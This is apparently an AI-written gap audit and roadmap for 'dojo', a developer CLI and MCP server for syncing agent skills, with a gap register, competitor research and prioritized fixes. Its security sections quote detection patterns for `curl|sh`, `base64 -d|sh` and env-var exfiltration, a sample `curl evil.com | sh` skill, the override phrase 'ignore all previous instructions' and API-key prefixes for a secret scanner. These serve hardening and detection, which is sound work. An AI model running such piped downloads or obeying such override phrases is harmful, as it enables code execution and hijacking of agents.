| Static security & prompt-injection scan (`dojo doctor`) | `internal/commands/doctor.go:42-50,207-240` | Scans installed skills for 4 regex patterns (`curl\|sh`, `base64 -d\|sh`, prompt injection strings, `curl/wget` env var exfiltration). Returns exit code `0` on warnings unless `error` severity is triggered (`doctor.go:242-255`). |
| Path traversal & symlink protection | `internal/catalog/security.go`, `internal/harness/sync.go` | Enforces `isSafeSkillDirectory` and `isContained` during skill installation and script execution. |
| Telemetry & privacy (`dojo telemetry`) | `internal/telemetry/firestore.go:33-135`, `internal/config/config.go:115-138` | Opt-in by default (`telemetry.enabled: false`, honors `DO_NOT_TRACK=1` and `DOJO_TELEMETRY=0`). However, when enabled, it authenticates to `legacy-project` Firebase (`DefaultReferer = "https://legacy-catalog.example.com/"`) and only allows hardcoded categories (`agents`, `analytics`, `coding`, `game-dev`, `media`, `writing`, `standards`). |
| Native MCP server (`dojo mcp`) | `internal/mcp/server.go:78-157` | Exposes 6 tools over `stdio` (`dojo_find`, `dojo_toc`, `dojo_load`, `dojo_run`, `dojo_learn`, `dojo_doctor`). Missing `dojo_sync` and `dojo_profile` tools (`G-04`). |

*(Note: Rubric sections 5.3/5.4/5.6 for Diwan customer ticket portals and email intake do not apply because `dojo` is a developer CLI/MCP tool with no ticket portal or email router; replaced above by flows 6.3 and 6.4.)*

---

## 7. Gap register

| ID | Category | Gap | Evidence | Type | Confidence | Severity | Affected flow | Business impact | Fix | Effort | Priority | Verification |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| **G-01** | E. Acquisition / F. Activation | **Missing GitHub Release binary assets & `dojo upgrade` tarball/zip incompatibility**: `README.md:16-17` and `scripts/install.sh:47` promise prebuilt binaries, but `v1.0.0`–`v1.2.0` have `0` assets (no `.github/workflows/release.yml`), and `internal/commands/upgrade.go:164` rejects `.tar.gz`/`.zip` files produced by `.goreleaser.yaml:27-32`. | `scripts/install.sh:47-61`, `.goreleaser.yaml:27-32`, `internal/commands/upgrade.go:161-165` | observed | High — verified via `gh release view v1.2.0 --json assets` and code inspection | **Critical** | Acquisition → install (`install.sh`) and self-upgrade (`dojo upgrade`) | Every user or container without a local `go` compiler fails to install or self-upgrade `dojo`; Go users wait 15–30s compiling from source. | 1. Add `.github/workflows/release.yml` to run GoReleaser on `v*` tags. 2. Update `performSelfUpgrade` in `upgrade.go` to untar/unzip `.tar.gz`/`.zip` release archives and verify `checksums.txt`. | S | **Now** | Push tag or upload release assets; run `scripts/install.sh` in a container without `go` installed and `dojo upgrade --force`. |
| **G-02** | J. Trust / G. Core flows | **Stale SHA-256 digest in `.well-known/agent-skills/index.json`**: `index.json:11` lists `sha256:5bc9c1...` for `skills/dojo/SKILL.md`, while the actual `v1.2.0` file hashes to `8055c4...`. | `.well-known/agent-skills/index.json:11`, `skills/dojo/SKILL.md` | observed | High — verified via `sha256sum` | **High** | Catalog discovery & RFC `v0.2.0` digest verification | Undermines Dojo's headline claim of RFC `v0.2.0` SHA-256 integrity verification (`README.md:9`) and causes strict clients to reject the `dojo` skill. | Update `.well-known/agent-skills/index.json` digest and add a unit test in `internal/catalog` that asserts `.well-known/agent-skills/index.json` digests match `skills/*/SKILL.md`. | S | **Now** | `go test ./internal/catalog` fails whenever `skills/*/SKILL.md` changes without updating `index.json`. |
| **G-03** | J. Trust / security | **`dojo profile push` and `dojo profile sync` push local files to GitHub without secret or security scanning**: `pushSkillsToTarget` stages, commits, and pushes local skills/commands from `~/` (`profile.go:650-677`) without running `doctor` security/secret patterns or warning if the target GitHub repo is public. | `internal/commands/profile.go:563-678`, `internal/commands/doctor.go:42-50` | observed | High — directly observed in `pushSkillsToTarget` | **High** | Personal Skills Registry sync (`dojo profile push` / `sync`) | A developer running `dojo profile sync` can accidentally push proprietary prompts, API keys (`sk-...`, `ghp_...`, `AIza...`), or unsafe scripts from `~/.claude/commands` to a public GitHub repo. | Run a pre-push secret & security scan (checking for API key patterns + `doctor` rules) inside `pushSkillsToTarget`; abort push unless `--force` is passed. | S | **Now** | Unit test attempting `dojo profile push` with a dummy `ghp_123456...` token in `SKILL.md` fails with exit code `1`. |
| **G-04** | G. Core flows / C. Offer | **`dojo mcp` omits `dojo_sync` and `dojo_profile` tools**: The MCP server (`internal/mcp/server.go:78-157`) exposes 6 tools (`find`, `toc`, `load`, `run`, `learn`, `doctor`) but does not expose `dojo_sync` or `dojo_profile_pull`/`push`/`sync`. | `internal/mcp/server.go:78-157`, `internal/commands/mcp.go:55-155` | observed | High — directly observed in `mcp.Tools()` | **High** | Native MCP Server (`dojo mcp`) | Agents using Dojo strictly via MCP (e.g., Claude Desktop, Cursor MCP) cannot trigger cross-harness reconciliation or pull/push from the user's Personal Skills Registry without dropping to raw bash. | Add `dojo_sync` and `dojo_profile` (`pull`, `push`, `sync`, `status`) tools to `internal/mcp/server.go` and `internal/commands/mcp.go`. | S | **Next** | `dojo mcp --print-schema` lists `dojo_sync` and `dojo_profile`, and MCP JSON-RPC `tools/call` executes them. |
| **G-05** | D. Pricing / A. Market & ICP | **No commercial offer, monetization path, or defined economic buyer**: `dojo` is 100% free Apache-2.0 with zero revenue mechanism, team tier, or commercial positioning. | `LICENSE`, `README.md`, `collect-signals.mjs` scan | observed | High — 0 billing/commercial signals in repo | **High** | Retention / expansion / revenue | If `dojo` is intended as a business rather than a pure OSS utility, it currently captures \$0 of the value it creates for multi-harness engineering teams. | Decide explicitly between: (A) Open-Core with a paid **Dojo Team Registry & CI Governance** tier (\$10/seat/mo benchmarked against Context7 Pro), or (B) Pure OSS acquisition funnel for Sila / consulting. | M | **Next** | Run experiment `E-01` (5 team interviews / fake-door CTA for private team registry + CI governance). |
| **G-06** | B. Value proposition / M. Measurement | **Upstream `legacy-catalog.example.com` dependency in default catalog and telemetry**: `DefaultRemoteURL` points to `legacy-catalog.example.com` (`catalog.go:35`) and opt-in telemetry writes to `legacy-project` Firestore (`firestore.go:35-43`). | `internal/catalog/catalog.go:35`, `internal/telemetry/firestore.go:35-43` | observed | High — hardcoded constants in source | **Medium** | Catalog discovery & telemetry (`dojo update`, `dojo telemetry`) | Dojo's primary index availability and community usage counters depend on an external upstream author's Firebase project rather than Dojo-controlled infrastructure, and custom categories outside the 7 hardcoded ones in `firestore.go:50-58` are silently dropped. | Host Dojo's own aggregated RFC `v0.2.0` index (e.g., GitHub Pages / Cloudflare Pages on `dojo` domain) and either point telemetry to a Dojo endpoint or remove Firestore telemetry in favor of GitHub star/release metrics. | M | **Next** | `DefaultRemoteURL` serves Dojo's own aggregated index while keeping `legacy-catalog.example.com` as a federated catalog. |
| **G-07** | J. Trust / security | **`dojo doctor --security` exits `0` on security warnings and is not wired into `dojo learn` or CI**: `doctor.go:223` records prompt-injection and `curl \| sh` matches as `Severity: "warn"`, which returns `ExitSuccess` (`0`) (`doctor.go:286-298`), and `dojo learn` does not scan remote skills on install. | `internal/commands/doctor.go:220-298`, `internal/commands/learn.go` | observed | High — verified in `doctor.go:242-298` | **Medium** | Skill installation (`learn`) & CI auditing (`doctor`) | CI pipelines running `dojo doctor --security` will pass (`exit 0`) even when a skill contains `ignore all previous instructions` or `curl ... \| sh`. | Add `--strict` (or elevate prompt-injection/exfiltration to `error` when `--security` is explicitly passed) so `dojo doctor --security` exits non-zero in CI, and run a scan summary during `dojo learn`. | S | **Now** | `dojo doctor --security` returns non-zero exit code when a skill matches `securityPatterns`. |
| **G-08** | G. Core flows | **Silent last-write-wins overwrite during bi-directional harness reconciliation**: `ReconcileHarnesses` (`internal/harness/sync.go:295-320`) overwrites canonical `.agents/skills/<name>/SKILL.md` whenever a harness copy has a newer `ModTime`, without saving a backup or warning on diverged content. | `internal/harness/sync.go:295-320` | observed | High — directly observed in `sync.go` | **Medium** | Multi-harness sync (`dojo sync` / `dojo sila`) | If a user edits `.cursor/rules/foo.mdc` and `.gemini/skills/foo/SKILL.md` in the same session before syncing, the slightly older edit is silently overwritten. | Hash-compare both files against the last synced digest (or create a `.bak` / warning when both canonical and harness files changed since last sync). | M | **Later** | Unit test modifying both `.gemini/skills/x/SKILL.md` and `.claude/skills/x/SKILL.md` emits a conflict warning or preserves backup. |
| **G-09** | F. Activation / C. Offer | **`skills/legacy-skill/SKILL.md` exceeds Dojo's own 6,000B single-page token budget (`7,378` bytes)**: Running `dojo doctor --skills` in the repo triggers a warning on Dojo's own bundled `legacy-skill` skill (`⚠ [budget:legacy-skill] SKILL.md body is 7378 bytes`). | `skills/legacy-skill/SKILL.md`, live `dojo doctor --skills --security` output | observed | High — reproduced via `dojo doctor --skills` | **Low** | Repo dogfooding (`dojo doctor`) | Shipping a warning in Dojo's own repository weakens credibility when demonstrating `dojo doctor` to users. | Trim `skills/legacy-skill/SKILL.md` body below `6,000` bytes (moving detailed `::notation` examples to `skills/legacy-skill/references/`). | S | **Now** | `dojo doctor --skills --security` in `/home/antigravity/jadmadi/dojo` outputs `0 warnings`. |

**Gap count by category**

| Category | Critical | High | Medium | Low |
| --- | --- | --- | --- | --- |
| A. Problem / market / ICP | 0 | 0 | 0 | 0 |
| B. Value proposition | 0 | 0 | 1 (`G-06`) | 0 |
| C. Offer / scope | 0 | 1 (`G-04`) | 0 | 0 |
| D. Pricing / unit economics | 0 | 1 (`G-05`) | 0 | 0 |
| E. Acquisition / distribution | 1 (`G-01`) | 0 | 0 | 0 |
| F. Activation / onboarding | 0 | 0 | 0 | 1 (`G-09`) |
| G. Core flows | 0 | 1 (`G-02`) | 1 (`G-08`) | 0 |
| H. Service workflow / bridge | N/A | N/A | N/A | N/A |
| I. Portal / customer experience | N/A | N/A | N/A | N/A |
| J. Trust / security / compliance | 0 | 1 (`G-03`) | 1 (`G-07`) | 0 |
| K. Retention / expansion | 0 | 0 | 0 | 0 |
| L. Operations / support | 0 | 0 | 0 | 0 |
| M. Measurement | 0 | 0 | 0 | 0 |
| N. Localization / market fit | N/A | N/A | N/A | N/A |
| O. Technical scalability / cost | 0 | 0 | 0 | 0 |
| P. Moat / roadmap | 0 | 0 | 0 | 0 |

---

## 8. Market and competitor research

| Competitor / alternative | Segment | Offer | Pricing metric / entry | Strengths | Gap or opportunity for Dojo | Source |
| --- | --- | --- | --- | --- | --- | --- |
| **Legacy CLI (`legacy-upstream/cli` & `legacy-catalog.example.com`)** | Individual AI-assisted developers | Static Go CLI + `.well-known` Agent Skills catalog for finding and loading `SKILL.md` files on demand. | Free (Apache-2.0 OSS) | Original creator of `legacy-catalog.example.com`; clean `find`/`load`/`run` primitives and `::` shortcut notation. | One-way catalog consumer only. Does **not** have `dojo toc` / `#section` paging, bi-directional 7-harness sync (`sila`), MCP server, or Personal Skills Registry (`dojo profile link|sync|pull`). | `https://legacy-catalog.example.com/` & `https://legacy-catalog.example.com/posts/the-pragmatic-guide-to-agent-skills/` (accessed 2026-11-07) |
| **Context7 (`upstash/context7`)** | Individual devs, Pro teams, and Enterprises | MCP server + CLI (`ctx7`) + grounding API injecting version-specific library docs and private repo context into coding agents. | **Free**: 1,000 API calls/mo (public repos). **Pro**: **\$10/seat/mo** (2,000–5,000 calls/seat + \$5/1M tokens for private repo parsing). **Enterprise**: **\$30/user/mo** down to \$2.50/user/mo at scale (SSO, SOC-2, self-hosted). | Massive adoption (56.5k+ GitHub stars, 104k+ libraries indexed); proves teams pay \$10–\$30/seat/mo for private repo context, RBAC/SSO, and LLM injection scanning. | Context7 focuses on external library documentation, **not** bi-directional local harness skill sync (`.gemini` <-> `.claude` <-> `.cursor`) or personal slash-command/skill migration to `agy-vm`. | `https://context7.com/plans` & `https://github.com/upstash/context7` (accessed 2026-11-07) |
| **Smithery (`smithery.ai`, part of Arcade)** | Agent builders & MCP consumers | Registry and CLI (`smithery`) for discovering, publishing, and connecting MCP servers and skills. | Free public registry; pivoted hosted MCP proxy/managed identity on Oct 31, 2026 toward Arcade platform. | High brand recognition in MCP discovery; `smithery mcp publish` workflow. | Focused on remote MCP servers rather than local-to-cloud `SKILL.md` file projection and multi-harness `.mdc`/`SKILL.md` transpilation. | `https://www.smithery.ai/` & `https://smithery.ai/future` (accessed 2026-11-07) |
| **Glama (`glama.ai`)** | MCP developers & enterprises | MCP Server Registry (117,219+ servers scanned & scored), browser inspector, and hosted MCP gateway with usage/cost attribution. | Free public directory; commercial gateway & usage analytics. | Automated security/quality scoring of 117k+ servers; strong SEO and inspection tooling. | Does not manage local `.agents/skills` / `.gemini/skills` directories or synchronize personal skills across laptops and remote VMs. | `https://glama.ai/` & `https://glama.ai/mcp/faq` (accessed 2026-11-07) |
| **Cursor Directory (`cursor.directory`)** | Cursor IDE users | Community directory of `.cursorrules` prompts and MCP server links. | Free community directory (monetized via featured listings/ads). | Large library of language/framework rules for Cursor. | Single-editor lock-in (Cursor only), copy-paste UX, no CLI version control, no `#section` token budgeting, no `agy-vm` or Antigravity support. | `https://cursor.directory/` (accessed 2026-11-07) |
| **Continue Hub (`continue.dev`)** | Open-source IDE plugin users | Registry (`api.continue.dev`) for assistant blocks, rules, prompts, and MCP configs (acquired by Cursor in 2026). | Free OSS / absorbed into Cursor ecosystem. | Standardized `config.yaml` composable blocks for rules and slash prompts. | Post-acquisition by Cursor, independent multi-harness neutrality is weakened; Dojo remains a neutral Switzerland across Antigravity, Claude, Cursor, Windsurf, OpenCode, and Sila. | `https://continue.dev/` & `https://apis.io/providers/continue-dev/` (accessed 2026-11-07) |
| **Status Quo (Git dotfiles / Stow / custom bash scripts)** | Engineers using laptops + cloud VMs | Manual git repos (` dotfiles `) with custom `ln -s` scripts or manual copy-pasting into `.gemini/skills` and `.claude/skills`. | \$0 (engineering time cost) | Zero third-party dependencies; full user control. | Breaks across harnesses (Cursor requires `.mdc` frontmatter; Antigravity often requires real directory copies or specific `~/.gemini/skills` paths; remote `agy-vm` instances don't mount local `~/.gemini/skills`). | Observed in `Feedback_Report_Remote_Agent_Skills_Loading.md` (2026-11-07) |

**What buyers and users expect in this category**

- **Zero-friction single-binary install (<5 seconds):** Developers expect `curl ... | sh` or `brew install` / `npx` to download a prebuilt static binary immediately without requiring a local Go compiler (`scripts/install.sh:47`).
- **Context-window discipline:** As skill libraries grow past 15–50 skills, loading full `SKILL.md` files blows up prompt caches and token costs (`https://legacy-catalog.example.com/posts/the-pragmatic-guide-to-agent-skills/`, accessed 2026-11-07). Progressive disclosure (`dojo toc` + `dojo load #section`) directly solves this.
- **Cross-environment portability (Laptop ↔ Cloud VM):** With cloud-hosted remote agents (such as Google Antigravity `agy-vm`, Devin, Claude Code on the web, GitHub Codespaces), users expect their local skills and slash commands to follow them automatically (`dojo profile link` / `sync` / `pull`).
- **Trust & injection safety:** Enterprise buyers (as evidenced by Context7's Trust/Plans FAQ at `https://context7.com/plans`, accessed 2026-11-07) expect prompt-injection detection, repository trust scoring, and strict guarantee that private keys/code are never leaked when syncing.

**Differentiation assessment**

- **This product's credible wedge:** **"The Multi-Harness & Laptop-to-CloudVM Continuity Engine for Agent Skills."** No other tool combines (1) bi-directional reconciliation across Antigravity, Claude, Cursor (`.mdc`), Windsurf, OpenCode, and Sila, (2) two-way GitHub Personal Skills Registry (`dojo profile link|sync|pull`) designed specifically for local-to-`agy-vm` continuity, and (3) section-level Markdown paging (`dojo toc` + `dojo load #section`).
- **Where it is at parity:** Keyword search (`find`), basic skill installation (`learn`), and `stdio` MCP tool serving.
- **Where it is behind:** Binary release automation (`0` GitHub Release assets vs competitors' instant `npx`/prebuilt binaries), web catalog/registry UI (CLI-only today vs `smithery.ai`, `glama.ai`, `context7.com`), and commercial team features (no hosted team registry, RBAC, or LLM-based security scoring).
- **What the wedge requires to be defensible:**
  1. Flawless 1-second binary installation on every fresh `agy-vm` and developer laptop (`G-01`).
  2. Automatic pre-push secret/injection guardrails so users trust `dojo profile sync` with their `~/.claude` and `~/.gemini` directories (`G-03`).
  3. Full MCP parity (`dojo_sync`, `dojo_profile`) so agents can self-service skill continuity without human CLI intervention (`G-04`).

---

## 9. Structured thinking analysis

**Methods selected and why:**
1. **Issue Tree (mandatory):** Decomposes where `dojo` loses adoption, trust, or commercial value across the user lifecycle.
2. **Inversion (mandatory):** Identifies concrete mechanisms that would cause `dojo` to fail or lose user trust over the next 12 months.
3. **Impact-Effort Matrix (mandatory):** Ranks the 9 evidence-backed gaps by business consequence and engineering scope.
4. **Minto Pyramid (mandatory):** Structures this report verdict-first.
5. **First Principles (optional):** Separates the fundamental job-to-be-done of `dojo` from inherited `legacy-skill` implementation artifacts.
6. **Second-Order Thinking (optional):** Traces the downstream consequences of enabling zero-argument `dojo profile sync` across local machines and GitHub repositories.

### 9.1 Issue tree

```text
Question: Where does Dojo lose user value, trust, or commercial potential between discovery and daily retention?
Splitting rule: User & team lifecycle stage (Acquisition → Activation → Core Loop → Trust/Safety → Monetization)

1. Acquisition & Installation
   ├─ Is the value proposition clear in 5 seconds?        [observed: YES — README.md:7-35 is clear and concrete]
   ├─ Does the one-line installer work without Go?        [observed: NO (G-01) — v1.2.0 has 0 release assets; fails without `go`]
   └─ Does self-upgrade (`dojo upgrade`) work on tarballs?[observed: NO (G-01) — upgrade.go:164 skips .tar.gz/.zip archives]

2. Activation & First Session
   ├─ Does install auto-bootstrap agents with `dojo`?     [observed: YES — scripts/install.sh:65-67 runs `learn dojo -g` + `sync -g`]
   ├─ Is the repo's own `.well-known` manifest valid?     [observed: NO (G-02) — index.json:11 has stale SHA-256 digest for `dojo`]
   └─ Does `dojo doctor` pass cleanly on Dojo's own repo? [observed: NO (G-09) — `legacy-skill` skill triggers 7,378B > 6,000B budget warning]

3. Core Continuity Delivery (CLI & MCP)
   ├─ Does bi-directional harness sync work on CLI?       [observed: YES — internal/harness/sync.go supports 7 harnesses]
   ├─ Does Personal Skills Registry sync work on CLI?     [observed: YES — `profile link|sync|pull|push` verified in v1.2.0]
   ├─ Can MCP-connected agents invoke `sync` & `profile`? [observed: NO (G-04) — internal/mcp/server.go only exposes 6 tools]
   └─ Are concurrent multi-harness edits conflict-safe?   [observed: PARTIAL (G-08) — last-write-wins by ModTime without backup]

4. Trust, Security & Brand Independence
   ├─ Does `profile push/sync` block accidental secret leaks? [observed: NO (G-03) — commits & pushes to GitHub without secret scan]
   ├─ Does `doctor --security` fail CI on warnings?       [observed: NO (G-07) — exits 0 on `warn` severity]
   └─ Does Dojo control its default catalog & telemetry?  [observed: NO (G-06) — hardcoded to `legacy-catalog.example.com` / `legacy-project`]

5. Retention, Team Expansion & Monetization
   ├─ Is there a team collaboration artifact?             [observed: YES — portable `skills.json` + GitHub repo registry]
   └─ Is there a commercial offer or paid team tier?      [observed: NO (G-05) — $0 Apache-2.0 OSS; no paid tier or buyer path]
```

**Highest-leverage leaf:** **1.2 / 1.3 (`G-01`: Prebuilt binary release assets + `upgrade.go` archive extraction)** — because every remote `agy-vm` bootstrap and every non-Go developer hits `scripts/install.sh` first. Fixing `.github/workflows/release.yml` and `upgrade.go:164` takes <2 hours and removes the single largest top-of-funnel failure mode.

### 9.2 Inversion

*Outcome to avoid:* **"In 12 months, `dojo` is abandoned by multi-harness developers, causes a credential-leak incident via `dojo profile sync`, or remains an unmonetized fork overshadowed by native IDE sync."**

| Failure mechanism | Evidence in this repo | Prevention / detection / recovery | Verification |
| --- | --- | --- | --- |
| **F-1: Accidental secret leak via `dojo profile sync`** — A user links a GitHub repo (`dojo profile link`) and runs `dojo profile sync`; Dojo packages `~/.claude/commands` or `~/.gemini/skills` containing a hardcoded API key or internal URL and auto-pushes it to GitHub (`git push`). | `internal/commands/profile.go:650-677` runs `git add`, `git commit`, `git push` on packaged home-directory skills with zero secret scanning. | Add a mandatory pre-push secret & security scanner in `pushSkillsToTarget` (detecting `ghp_`, `github_pat_`, `sk-`, `AIza`, `AKIA`, private keys, and `.env` references) that aborts the push unless `--force` is specified. | Automated test in `dojo_features_test.go` verifying `dojo profile push` aborts and leaves zero git commits when a skill contains a secret token pattern. |
| **F-2: Non-Go users bounce on install (`curl \| sh`)** — Python/TS/Rust developers using Cursor or Claude Code run the `README.md` install one-liner on a machine without Go installed and get `Error: Neither prebuilt archive ... nor 'go' toolchain is available`. | `scripts/install.sh:51-61`, `gh release view v1.2.0 --json assets` (`"assets": []`), `.github/workflows` missing. | Add `.github/workflows/release.yml` using `goreleaser/goreleaser-action` to publish `linux/darwin/windows` (`amd64`/`arm64`) archives on every tag, and update `upgrade.go:161-195` to extract `.tar.gz`/`.zip`. | `gh release view v1.2.1 --json assets` lists 6 OS/arch archives + `checksums.txt`, and `scripts/install.sh` succeeds with `PATH=/usr/bin:/bin` (no `go`). |
| **F-3: RFC `v0.2.0` integrity rejection** — External tools or users run digest verification against `jadmadi/dojo/.well-known/agent-skills/index.json` and fail because `skills/dojo/SKILL.md` was updated without updating `index.json`. | `.well-known/agent-skills/index.json:11` (`5bc9c1...` vs actual `8055c4...`). | Add a test in `internal/catalog/catalog_test.go` that recomputes SHA-256 of every local file in `.well-known/agent-skills/index.json` and fails `go test` on mismatch. | `go test ./internal/catalog` enforces digest parity on every commit. |
| **F-4: Malicious skill passes `dojo doctor --security` in CI** — A team puts `dojo doctor --security` in GitHub Actions, a PR adds a skill with `curl evil.com \| sh` or prompt injection, and CI passes because `doctor` emits `Severity: "warn"` and exits `0`. | `internal/commands/doctor.go:223,286-298` returns `ExitSuccess` (`0`) when `hasError == false`, even if `warnCount > 0` under `--security`. | Make `dojo doctor --security` treat security pattern matches as `error` (or exit non-zero whenever `--security` finds a match). | Unit test in `dojo_features_test.go` asserting `RunDoctor([]string{"--security"})` returns `ExitGeneral` (`1`) when a skill contains `curl ... \| sh`. |

- **Most likely failure:** **F-2** (already happening today for any user without `go` in `PATH`) and **F-3** (already happening today in `.well-known/agent-skills/index.json:11`).
- **Most preventable high-impact failure:** **F-1** (preventing `dojo profile sync` from pushing secrets to GitHub requires ~40 lines of regex scanning before `git commit`).

### 9.3 Impact-effort

- **Impact definition:** Consequence on user activation, security/trust, core loop completion across CLI + MCP, or commercial viability (`High` = blocks install, risks credential leak, or unlocks core wedge; `Medium` = improves reliability/independence; `Low` = repo hygiene).
- **Effort definition:** Practical engineering and operational work (`S` = <1 day / single-package change; `M` = 2–5 days across multiple packages/infra; `L` = >1 week or new hosted service).

| Gap | Impact (why) | Effort (why) | Priority |
| --- | --- | --- | --- |
| **G-01: Prebuilt release binaries & `upgrade.go` archive extraction** | **High** — Unblocks `curl \| sh` install and `dojo upgrade` for all non-Go users and fast container startups. | **S** — `.goreleaser.yaml` already exists; only needs `.github/workflows/release.yml` + `archive/tar` extraction in `upgrade.go`. | **Now** |
| **G-02: Fix stale SHA-256 digest in `.well-known/agent-skills/index.json` + test gate** | **High** — Restores RFC `v0.2.0` SHA-256 integrity on Dojo's own flagship skill. | **S** — 1-line JSON update + 25-line test in `internal/catalog`. | **Now** |
| **G-03: Pre-push secret & security scan in `dojo profile push` / `sync`** | **High** — Prevents accidental exfiltration of user API keys or sensitive prompts from `~/` to GitHub. | **S** — Reuse `doctor.go` patterns + common token prefixes (`ghp_`, `sk-`, `AIza`, `AKIA`) inside `pushSkillsToTarget`. | **Now** |
| **G-07: Non-zero exit code on `dojo doctor --security` findings** | **Medium-High** — Makes `dojo doctor --security` usable as an enforceable CI quality gate. | **S** — 10-line change in `internal/commands/doctor.go`. | **Now** |
| **G-09: Trim `skills/legacy-skill/SKILL.md` under 6,000B budget** | **Low-Medium** — Eliminates the self-inflicted warning when running `dojo doctor` on the Dojo repo. | **S** — Move `::notation` examples to `skills/legacy-skill/references/`. | **Now** |
| **G-04: Expose `dojo_sync` and `dojo_profile` tools in `dojo mcp`** | **High** — Gives MCP-connected agents full access to Dojo's core continuity wedge (`sync`, `profile pull/push`). | **S** — Add 2 tool schemas in `internal/mcp/server.go` and handlers in `internal/commands/mcp.go`. | **Next** |
| **G-06: Decouple default catalog & telemetry from `legacy-catalog.example.com`** | **Medium** — Establishes independent catalog uptime and removes silent dropping of non-`legacy-upstream` telemetry categories. | **M** — Host aggregated `index.json` on GitHub Pages / Cloudflare and update `DefaultRemoteURL`. | **Next** |
| **G-05: Commercial / Open-Core validation (Team Registry & CI Governance)** | **High (if commercial)** — Determines whether Dojo is a revenue-generating product or a pure OSS community tool. | **M** — Customer discovery + landing page test (`E-01`) before writing any billing code. | **Next** |
| **G-08: Conflict backup/detection in `ReconcileHarnesses`** | **Medium** — Prevents silent overwrite when the same skill is edited in two harnesses simultaneously. | **M** — Track last-synced content hash in `state.json` and save `.bak` on two-sided modification. | **Later** |

**Top three moves:**
1. **Ship prebuilt binaries & fix `dojo upgrade` tarball extraction (`G-01`)** + **fix `.well-known` SHA-256 digest (`G-02`)**.
2. **Harden `dojo profile push/sync` with pre-push secret scanning (`G-03`)** + **make `dojo doctor --security` fail CI on security matches (`G-07`)**.
3. **Expose `dojo_sync` and `dojo_profile` in `dojo mcp` (`G-04`)** so any MCP client can sync and pull registries autonomously.

### 9.4 Optional methods used

- **First Principles (`references/structured-thinking.md:240-251`) — Question resolved:** *Which parts of `dojo` are essential to its unique job-to-be-done versus inherited from `legacy-upstream/cli`?*
  - *Underlying job:* Developers and autonomous agents use multiple harnesses (Antigravity, Claude, Cursor) across multiple machines (local laptop + ephemeral `agy-vm`) and need their skills/commands available everywhere without blowing up context budgets.
  - *Inherited artifacts from `legacy-skill`:* `DefaultRemoteURL = "https://legacy-catalog.example.com/..."` (`catalog.go:35`), `legacy-project` Firestore telemetry (`firestore.go:35`), and the 7,378-byte `skills/legacy-skill/SKILL.md` dialect guide.
  - *Conclusion:* Dojo's true core is **Multi-Harness + Cloud-VM Continuity (`sync`, `sila`, `profile`) + Progressive Section Paging (`toc`, `load #section`)**. The inherited `legacy-project` Firestore telemetry adds code complexity without giving Dojo visibility into its own users.
- **Second-Order Thinking (`references/structured-thinking.md:174-183`) — Question resolved:** *What happens after users adopt zero-argument `dojo profile sync` (`v1.2.0`)?*
  - *1st order:* Users link `github:<user>/my-skills` and run `dojo profile sync` to effortlessly back up and sync all local skills and slash commands across their laptop and `agy-vm`.
  - *2nd order:* Because `discoverPushCandidates` (`internal/commands/profile.go:680-760`) scans `~/.claude/commands`, `~/.gemini/skills`, and `~/.cursor/rules`, personal slash commands that contain hardcoded project tokens, internal URLs, or proprietary snippets get automatically packaged and pushed to GitHub.
  - *3rd order:* If that GitHub repository is public (or shared across an org), a single `dojo profile sync` causes a credential leak—destroying trust in Dojo. Therefore, pre-push secret scanning (`G-03`) is a mandatory guardrail for `v1.2.1`.

---

## 10. Prioritized roadmap

### Now (next 1–2 delivery cycles — `v1.2.1`)

| Move | Gap(s) | Why now | Acceptance check |
| --- | --- | --- | --- |
| **1. Automate prebuilt release binaries & fix `upgrade.go` archive extraction** | `G-01` | Unblocks `scripts/install.sh` and `dojo upgrade` for every machine without a local Go toolchain. | `.github/workflows/release.yml` uploads `tar.gz`/`zip` assets; `upgrade.go` extracts `.tar.gz`/`.zip` and passes unit tests. |
| **2. Update `.well-known/agent-skills/index.json` digest & add CI test** | `G-02`, `G-09` | Fixes broken SHA-256 verification on `skills/dojo/SKILL.md` and trims `skills/legacy-skill/SKILL.md` below 6,000B. | `go test ./...` verifies `.well-known` digests match `skills/*/SKILL.md` and `dojo doctor --skills --security` reports `0 warnings`. |
| **3. Add pre-push secret & security gate to `dojo profile push` / `sync` & strict `--security` exit code** | `G-03`, `G-07` | Prevents accidental secret leaks to GitHub and makes `dojo doctor --security` enforceable in CI. | `dojo profile push` aborts with exit code `1` if a packaged file contains secret token patterns (`ghp_`, `sk-`, `AIza`, `AKIA`), and `dojo doctor --security` exits `1` on security matches. |

### Next (after foundation fixes — `v1.3.0`)

| Move | Gap(s) | Trigger to start | Acceptance check |
| --- | --- | --- | --- |
| **4. Expose `dojo_sync` and `dojo_profile` in `dojo mcp`** | `G-04` | Immediately after `v1.2.1` release. | MCP clients can call `dojo_sync` and `dojo_profile` (`pull`, `push`, `sync`) via JSON-RPC 2.0. |
| **5. Host Dojo's own aggregated RFC `v0.2.0` catalog index** | `G-06` | When curating Dojo-verified skills beyond `legacy-catalog.example.com`. | `DefaultRemoteURL` points to Dojo's own `.well-known/agent-skills/index.json` federating `dojo`, `legacy-skill`, and `gemini-skills`. |
| **6. Validate Team Registry / Governance willingness-to-pay (`E-01`)** | `G-05` | Before writing any SaaS or billing code. | 5 team interviews or landing page CTA completed with clear Proceed/Pivot decision on monetization. |

### Later (defer until traction or a decision)

| Move | Gap(s) | Why later |
| --- | --- | --- |
| **7. Three-way conflict detection & `.bak` snapshots in `ReconcileHarnesses`** | `G-08` | Edge case (simultaneous un-synced edits to the same skill in two editors); solve after installation and security guardrails. |
| **8. Hosted Team Registry SaaS with SSO & LLM security scoring** | `G-05` | Only build if Experiment `E-01` proves teams won't just use private GitHub repos with `dojo profile link`. |

### Not worth doing

| Idea | Why not |
| --- | --- |
| **Building a generic public MCP server directory to compete head-on with Glama (117k servers) or Smithery** | Commodity web directory space is saturated; Dojo's unfair advantage is **local-to-cloud multi-harness skill continuity (`sync` + `profile`)** and **progressive `#section` paging (`toc` + `load`)**. |
| **Adding payment/billing code into the open-source CLI right now** | Zero buyer validation exists yet, and gating local CLI commands behind a paywall would kill developer adoption. |

---

## 11. Experiments to resolve uncertainty

| # | Hypothesis | Cheapest test | Success metric | Cost | Time-box | What it changes |
| --- | --- | --- | --- | --- | --- | --- |
